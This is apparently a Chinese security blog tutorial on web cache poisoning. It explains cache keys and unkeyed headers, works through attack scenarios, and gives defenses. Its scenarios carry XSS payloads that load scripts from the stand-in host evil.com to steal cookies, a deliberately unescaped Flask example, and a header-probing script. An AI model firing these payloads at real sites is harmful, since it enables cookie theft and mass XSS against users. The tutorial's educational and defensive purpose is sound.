---
title: Web缓存投毒攻击
date: 2026-07-01 08:00:00
tags:
  - Web安全
  - 渗透测试
categories: 渗透测试
---

## 前言

Web缓存是现代互联网基础设施的基石。CDN、反向代理和浏览器缓存通过存储静态资源的副本，极大地降低了源站负载、减少了用户延迟。然而，缓存机制的设计缺陷也可能引入严重的安全风险——这就是**Web缓存投毒（Cache Poisoning）**。攻击者通过精心构造HTTP请求，诱使缓存服务器存储恶意响应，进而将攻击载荷分发给所有后续访问同一资源的用户，实现"一次投毒、批量受害"的规模化攻击效果。

---

## Web缓存基础

### 缓存的工作原理

```
┌──────────┐    请求     ┌──────────────┐   缓存未命中   ┌──────────┐
│  客户端   │ ─────────> │  缓存代理/CDN  │ ─────────────> │  源服务器  │
│ (Browser) │ <───────── │ (Cache Proxy) │ <───────────── │ (Origin)  │
└──────────┘    响应     └──────────────┘   获取源站响应   └──────────┘
                             │    ▲
                    缓存命中  │    │  存入缓存
                             ▼    │
                        ┌──────────┐
                        │  缓存存储  │
                        │ (Varnish/ │
                        │  Redis)   │
                        └──────────┘
```

缓存代理收到客户端请求后，首先检查是否已有该资源的缓存副本。若命中则直接返回缓存内容；若未命中则回源获取，并将响应存入缓存以供后续使用。

### 缓存键（Cache Key）

缓存系统的核心概念是**缓存键**——用于唯一标识缓存条目的字符串。大多数缓存系统默认选择以下HTTP头作为缓存键：

```
GET /index.html HTTP/1.1         ──> Cache-Key: GET|/index.html|
Host: example.com                ──> Cache-Key: GET|example.com|/index.html|
```

**关键矛盾在于：** 缓存键通常只包含请求方法、路径、Host等少数字段，而HTTP请求中还包含大量**未被纳入缓存键**的请求头和参数。这些被称为**非键输入（Unkeyed Inputs）**。

---

## 什么是缓存投毒

缓存投毒攻击利用"部分请求头影响源站响应但不影响缓存键"这一矛盾。攻击路径如下：

```
攻击者发送恶意请求
        │
        ▼
┌─────────────────────────────────────┐
│ 请求包含恶意非键输入（如 X-Forwarded-Host: evil.com）│
└─────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────┐
│ 源站未定义X-Forwarded-Host，但在响应中将其回显 │
│ 生成含恶意内容的响应体（如 <script src="//evil.com/xss.js">） │
└─────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────┐
│ 缓存以"方法+路径+Host"为键存储该恶意响应 │
└─────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────┐
│ 后续正常用户请求同一路径 -> 获得恶意缓存响应 │
└─────────────────────────────────────┘
```

**漏洞产生的三个前置条件：**
1. 缓存服务器存在"非键输入"
2. 源站对这些非键输入的处理会产生差异化的响应内容
3. 源站生成的差异化内容对用户有害（XSS、重定向等）

---

## 非键输入识别方法

### 常见非键请求头

缓存系统通常只将以下头纳入缓存键，其余均为潜在非键输入：

| 缓存键头（常见） | 非键头（潜在攻击面） |
|:---|:---|
| Host | X-Forwarded-Host |
| 请求方法 | X-Forwarded-Scheme |
| 请求路径 | X-Forwarded-Proto |
| | X-Forwarded-For |
| | X-Forwarded-Port |
| | Origin / Referer |
| | User-Agent（部分CDN已纳入） |
| | Cookie（敏感，通常不纳键但也不缓存） |
| | Accept / Accept-Encoding |
| | Upgrade-Insecure-Requests |
| | X-Original-URL |

### 手工探测步骤

```bash
# 第一步：发送正常请求，记录响应
curl -s -o normal.txt https://target.com/page

# 第二步：添加可疑头，观察响应差异
curl -s -o poisoned.txt https://target.com/page \
  -H "X-Forwarded-Host: attacker.com"

# 第三步：对比差异
diff normal.txt poisoned.txt
```

### 使用Param Miner自动化探测

Burp Suite的**Param Miner**扩展可以自动识别缓存键方法。其工作流程：

1. 安装Burp Suite社区版或专业版
2. 在BApp Store中搜索并安装"Param Miner"
3. 右键目标请求 -> "Guess headers"
4. Param Miner会尝试添加`X-Forwarded-Host`、`X-Original-URL`等常见头
5. 通过观察响应差异自动标记潜在的非键输入
6. 如果发现`X-Cache: miss`且响应中包含反射的输入，则存在投毒可能

---

## 实战攻击场景

### 场景一：X-Forwarded-Host 投毒导致XSS

**目标环境：** 源站使用`X-Forwarded-Host`头动态生成资源链接，而CDN未将其纳入缓存键。

**正常请求：**
```http
GET /index.html HTTP/1.1
Host: www.example.com
```

**正常响应：**
```html
<script src="https://www.example.com/assets/main.js"></script>
```

**攻击请求：**
```http
GET /index.html HTTP/1.1
Host: www.example.com
X-Forwarded-Host: evil.com"></script><script>alert(document.cookie)</script><!--
```

**投毒响应（被缓存）：**
```html
<script src="https://evil.com"></script><script>alert(document.cookie)</script><!--/assets/main.js"></script>
```

此时`index.html`对应的缓存条目已被污染，所有访问首页的用户都将触发XSS。

### 场景二：X-Original-URL 路径覆盖

某些反向代理（如特定版本的服务端框架）会解析`X-Original-URL`头来覆盖请求路径。

```http
GET /index.html HTTP/1.1
Host: www.example.com
X-Original-URL: /admin/login
```

缓存仍以`/index.html`为键存储，但源站返回了`/admin/login`的响应。攻击者可能使普通用户访问到管理后台的登录页面，进而实施钓鱼攻击。

```http
GET /index.html HTTP/1.1
Host: www.example.com
X-Original-URL: /non-existent-page?<script>alert(1)</script>
```

更危险的是，如果源站的404页面反射了请求路径，攻击者可以注入XSS载荷。

### 场景三：Cookie数据处理导致的投毒

某些缓存配置错误地将整个响应缓存（包括个性化内容），而只以路径作为缓存键：

```python
# 源站代码示例（Flask - 存在投毒风险）
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/greeting')
def greeting():
    # 从Cookie获取用户名并回显——Cookie不在缓存键中
    username = request.cookies.get('username', 'Guest')
    # 未做HTML转义
    response = make_response(f'<h1>Welcome, {username}!</h1>')
    # 源站未设置正确的缓存控制头
    return response
```

攻击过程：
```bash
# 攻击者发送带恶意Cookie的请求
curl https://target.com/greeting \
  -H "Cookie: username=<script src='//evil.com/steal.js'></script>"

# 缓存存储了含XSS的响应
# 后续无Cookie用户访问同一URL也会被攻击
```

**正确的防御写法：**
```python
from flask import Flask, request, make_response, escape

app = Flask(__name__)

@app.route('/greeting')
def greeting():
    username = request.cookies.get('username', 'Guest')
    # 使用转义函数 + 设置Vary头
    response = make_response(f'<h1>Welcome, {escape(username)}!</h1>')
    response.headers['Vary'] = 'Cookie'
    response.headers['Cache-Control'] = 'no-cache, private'
    return response
```

---

## 缓存欺骗 vs 缓存投毒

这两个概念常被混淆，但根本机制不同：

| 维度 | 缓存投毒 (Cache Poisoning) | 缓存欺骗 (Cache Deception) |
|:---|:---|:---|
| 攻击目标 | 修改缓存中公共资源的内容 | 将用户敏感内容缓存到公共缓存 |
| 攻击方向 | 攻击者 -> 缓存 -> 所有用户 | 受害者 -> 缓存 -> 攻击者 |
| 利用条件 | 非键输入影响响应 | URL规则混淆使敏感响应被缓存 |
| 典型载荷 | X-Forwarded-Host / 自定义头 | `/account.php/nonexistent.css` |
| 影响 | 受害者获得恶意内容 | 攻击者获得受害者敏感数据 |

### 缓存欺骗示例

```
攻击者诱导受害者访问:
  https://bank.com/account/profile/nonexistent.css

CDN规则:
  *.css 文件缓存30天

源站行为:
  忽略末尾的/nonexistent.css，返回 /account/profile 的完整内容

结果:
  CDN将受害者的账户页面作为CSS文件缓存
  攻击者随后访问同一URL即可获取受害者的个人信息
```

---

## CDN缓存绕过与投毒

### 常见CDN缓存机制差异

不同CDN的缓存策略存在差异，攻击者可以利用这些差异实现投毒：

```bash
# CloudFront：默认不缓存带 Authorization 头的响应
# Fastly：默认缓存所有内容，除非显式设置
# Cloudflare：默认缓存静态资源，绕过HTML页面

# 利用Accept-Encoding差异
curl -H "Accept-Encoding: gzip" https://target.com/page
curl -H "Accept-Encoding: br" https://target.com/page
# 部分CDN按不同Accept-Encoding生成不同的缓存条目
```

### 利用HTTP方法差异

```http
# 部分代理对GET和HEAD请求使用同一缓存空间
HEAD /index.html HTTP/1.1
Host: www.example.com
X-Forwarded-Host: evil.com

# 缓存键可能是 GET|/index.html| 或 HEAD|/index.html|
# 若两者共享缓存，HEAD请求的投毒将影响GET请求的响应
```

### Fat GET攻击

```http
# 在GET请求中发送请求体（违反RFC但对部分代理有效）
GET /api/data HTTP/1.1
Host: api.example.com
Content-Length: 30

{"user":"<script>alert(1)</script>"}
```

部分代理以`GET|path`为缓存键，但将请求体一并传递给源站。若源站反射请求体内容，则可能实现投毒。

---

## Param Miner 深度使用指南

```
Param Miner 功能清单:
│
├── Guess Headers ───────── 自动添加常用头列表进行探测
│   ├── X-Forwarded-Host, X-Forwarded-Scheme
│   ├── X-Original-URL, X-Rewrite-URL
│   ├── X-HTTP-Method-Override
│   ├── X-Forwarded-For, X-Real-IP
│   └── CF-Connecting-IP (Cloudflare)
│
├── Guess Params ────────── 自动探测GET/POST隐藏参数
│   ├── 常用参数字典爆破
│   └── 反射参数自动识别
│
├── Cache Key Detection ─── 自动识别缓存键构成
│   ├── 逐头添加检测缓存键变化
│   └── 输出哪些头被纳入缓存键
│
└── Report ──────────────── 生成详细探测报告
```

**高级用法示例脚本（Python + requests）：**

```python
import requests
from concurrent.futures import ThreadPoolExecutor

TARGET = "https://target.example.com/page"
HEADERS_TO_TEST = [
    "X-Forwarded-Host",
    "X-Forwarded-Scheme",
    "X-Forwarded-For",
    "X-Original-URL",
    "X-Rewrite-URL",
    "Origin",
    "Referer",
    "X-HTTP-Method-Override",
    "X-Real-IP",
    "CF-Connecting-IP",
    "True-Client-IP",
    "X-Custom-IP-Authorization",
]

def probe_header(header_name):
    """探测单个请求头是否影响响应且不在缓存键中"""
    # 正常请求
    resp_normal = requests.get(TARGET)
    cache_status_normal = resp_normal.headers.get("X-Cache", "")

    # 带测试头的请求
    test_value = "canary.poison.test"
    resp_test = requests.get(
        TARGET,
        headers={header_name: test_value}
    )
    cache_status_test = resp_test.headers.get("X-Cache", "")

    # 判断逻辑
    content_changed = (resp_normal.text != resp_test.text)
    test_value_reflected = (test_value in resp_test.text)
    still_cached = ("hit" in cache_status_normal.lower())

    if test_value_reflected and not still_cached:
        print(f"[!] 潜在投毒点: {header_name}")
        print(f"    响应中反射了测试值，请求可被缓存")
    elif content_changed:
        print(f"[~] 响应差异: {header_name} (未反射测试值)")

# 并发探测
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(probe_header, HEADERS_TO_TEST)
```

---

## 防御与修复

### 开发者侧

1. **禁用不必要请求头的处理：** 如果你的应用不使用`X-Forwarded-Host`、`X-Original-URL`等非标准头，不要解析它们。

2. **设置正确的Vary头：**
```http
Vary: Cookie, User-Agent, Accept-Encoding
```
`Vary`头告知缓存代理："当这些头部的值不同时，请生成独立的缓存条目"。这样可以防止Cookie等敏感信息的跨用户泄漏。

3. **输出编码：** 永远不要直接将请求数据回显到响应中而不做上下文相关的转义。

4. **缓存控制头策略：**
```http
Cache-Control: no-cache, private
# 或针对具体路径
Cache-Control: public, max-age=3600, s-maxage=86400
```

### 运维/安全侧

5. **审查CDN/代理配置：**
   - 确认缓存键包含所有影响响应的请求头
   - 关闭对非标准头的转发（`X-Original-URL`等）
   - 配置仅缓存特定状态码和内容类型的响应

6. **WAF规则检测：**
```nginx
# Nginx示例：拒绝包含可疑头的请求
if ($http_x_original_url) {
    return 403;
}
if ($http_x_forwarded_host ~* "[<>\"']") {
    return 403;
}
```

7. **定期进行缓存投毒渗透测试：**
   - 使用Param Miner扫描所有端点
   - 审计自定义和非标准请求头的处理逻辑
   - 验证CDN和反向代理的缓存键配置

---

## 总结

Web缓存投毒是一类常被忽视但影响范围极大的Web安全漏洞。其核心矛盾在于**缓存键与响应生成逻辑的解耦**——少数头部决定缓存键，而更多头部影响响应内容。这种不对称性为攻击者创造了机会。

**攻击面汇总：**
- 未纳入缓存键的HTTP请求头
- 非标准代理头（X-Forwarded-*、X-Original-URL等）
- Cookie中的个性化内容
- Fat GET请求体
- 不同CDN实现的缓存策略差异

**防御原则：**
1. 不在解析层处理非标准头
2. 凡影响响应内容的请求要素必须纳入缓存键
3. 缓存粒度与个性化粒度一致
4. 输出永远做上下文编码

---

> **免责声明**
>
> 本文所述技术和工具仅供安全研究和授权渗透测试使用。未经系统所有者明确书面授权而对任何系统进行缓存投毒测试或攻击均属违法行为，可能导致民事和/或刑事责任。作者不对任何误用本文信息造成的损害负责。读者应始终遵守适用的法律、法规以及漏洞披露的负责任原则。
